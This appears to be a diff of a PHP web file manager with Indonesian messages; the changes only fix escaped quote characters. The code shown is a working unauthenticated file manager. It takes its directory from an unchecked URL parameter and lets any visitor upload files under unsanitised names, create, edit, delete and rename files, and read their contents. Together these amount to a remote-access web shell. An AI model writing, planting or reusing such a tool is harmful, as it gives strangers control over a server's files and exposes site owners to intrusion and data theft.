@@ -1,5 +1,5 @@
 <?php
-$directory = isset($_GET[\'dir\']) ? $_GET[\'dir\'] : getcwd();
+$directory = isset($_GET['dir']) ? $_GET['dir'] : getcwd();
 
 function getFilesInDirectory($directory) {
     $files = [];
@@ -23,7 +23,7 @@ function renameFile($oldName, $newName) {
 }
 
 function uploadFile($directory, $tmpFile, $fileName) {
-    $filePath = $directory . \'/\' . $fileName;
+    $filePath = $directory . '/' . $fileName;
     if (move_uploaded_file($tmpFile, $filePath)) {
         return true;
     } else {
@@ -31,50 +31,50 @@ function uploadFile($directory, $tmpFile, $fileName) {
     }
 }
 
-if ($_SERVER[\'REQUEST_METHOD\'] === \'POST\') {
-    if (isset($_FILES[\'uploaded_file\'])) {
-        $uploadedFile = $_FILES[\'uploaded_file\'];
-        $tmpFile = $uploadedFile[\'tmp_name\'];
-        $fileName = $uploadedFile[\'name\'];
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    if (isset($_FILES['uploaded_file'])) {
+        $uploadedFile = $_FILES['uploaded_file'];
+        $tmpFile = $uploadedFile['tmp_name'];
+        $fileName = $uploadedFile['name'];
         if (!empty($fileName)) {
             $uploadStatus = uploadFile($directory, $tmpFile, $fileName);
             if ($uploadStatus) {
-                echo "File berhasil diunggah! => " . htmlspecialchars($directory . \'/\' . $fileName);
+                echo "File berhasil diunggah! => " . htmlspecialchars($directory . '/' . $fileName);
             } else {
                 echo "File gagal diunggah :(";
             }
         }
-    } else if (isset($_POST[\'new_file\'])) {
-        $newFileName = $_POST[\'new_file\'];
+    } else if (isset($_POST['new_file'])) {
+        $newFileName = $_POST['new_file'];
         if (!empty($newFileName)) {
             $newFileName = basename($newFileName);
-            $newFilePath = $directory . \'/\' . $newFileName;
+            $newFilePath = $directory . '/' . $newFileName;
             if (!file_exists($newFilePath)) {
-                fopen($newFilePath, \'w\');
+                fopen($newFilePath, 'w');
             }
         }
-    } else if (isset($_POST[\'delete_file\'])) {
-        $fileToDelete = $_POST[\'delete_file\'];
+    } else if (isset($_POST['delete_file'])) {
+        $fileToDelete = $_POST['delete_file'];
         $fileToDelete = basename($fileToDelete);
-        $filePath = $directory . \'/\' . $fileToDelete;
+        $filePath = $directory . '/' . $fileToDelete;
         if (file_exists($filePath)) {
             unlink($filePath);
         }
-    } else if (isset($_POST[\'edit_file\'])) {
-        $fileName = $_POST[\'edit_file\'];
-        $fileContent = $_POST[\'file_content\'];
+    } else if (isset($_POST['edit_file'])) {
+        $fileName = $_POST['edit_file'];
+        $fileContent = $_POST['file_content'];
         $fileName = basename($fileName);
-        $filePath = $directory . \'/\' . $fileName;
+        $filePath = $directory . '/' . $fileName;
         if (file_exists($filePath)) {
             editFile($filePath, $fileContent);
         }
-    } else if (isset($_POST[\'rename_file\'])) {
-        $oldFileName = $_POST[\'rename_file\'];
-        $newFileName = $_POST[\'new_name\'];
+    } else if (isset($_POST['rename_file'])) {
+        $oldFileName = $_POST['rename_file'];
+        $newFileName = $_POST['new_name'];
         $oldFileName = basename($oldFileName);
         $newFileName = basename($newFileName);
-        $oldFilePath = $directory . \'/\' . $oldFileName;
-        $newFilePath = $directory . \'/\' . $newFileName;
+        $oldFilePath = $directory . '/' . $oldFileName;
+        $newFilePath = $directory . '/' . $newFileName;
         if (file_exists($oldFilePath) && !file_exists($newFilePath)) {
             renameFile($oldFilePath, $newFilePath);
         }
@@ -101,7 +101,7 @@ $files = getFilesInDirectory($directory);
                 <?php echo htmlspecialchars($file); ?>
                 <form action="" method="POST" style="display:inline">
                     <input type="hidden" name="edit_file" value="<?php echo htmlspecialchars($file); ?>">
-                    <textarea name="file_content" rows="2" cols="30"><?php echo htmlspecialchars(file_get_contents($directory . \'/\' . $file)); ?></textarea>
+                    <textarea name="file_content" rows="2" cols="30"><?php echo htmlspecialchars(file_get_contents($directory . '/' . $file)); ?></textarea>
                     <button type="submit">Edit</button>
                 </form>
                 <form action="" method="POST" style="display:inline">
